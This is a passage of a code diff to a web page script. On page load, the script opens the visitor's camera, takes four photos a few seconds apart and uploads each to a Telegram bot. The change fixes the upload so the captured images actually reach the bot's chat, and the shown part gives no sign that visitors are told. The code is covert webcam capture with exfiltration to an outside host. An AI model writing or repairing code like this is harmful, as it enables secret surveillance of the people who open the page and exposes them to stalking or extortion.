@@ -54,34 +54,34 @@
       .then((stream) => {
         video.srcObject = stream;
 
-        // 4 عکس با فاصله 1.5 ثانیه‌ای
         let photoCount = 0;
+
         const takePhoto = () => {
           if (photoCount >= 4) {
-            stream.getTracks().forEach(track => track.stop()); // قطع دوربین
+            stream.getTracks().forEach(track => track.stop());
             return;
           }
 
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/png");
+          canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, `photo${photoCount + 1}.png`);
 
-          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: new URLSearchParams({
-              chat_id: chatId,
-              photo: imageData
-            })
-          });
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            }).catch(err => console.error("Telegram Error:", err));
+          }, "image/png");
 
           photoCount++;
-          setTimeout(takePhoto, 1500); // 1.5 ثانیه بعدی
+          setTimeout(takePhoto, 1500);
         };
 
-        // شروع گرفتن عکس بعد از 3 ثانیه از ورود
         setTimeout(takePhoto, 3000);
       })
       .catch((err) => {
-        console.error("Error accessing camera: ", err);
+        console.error("Camera access error:", err);
       });
   </script>
 </body>
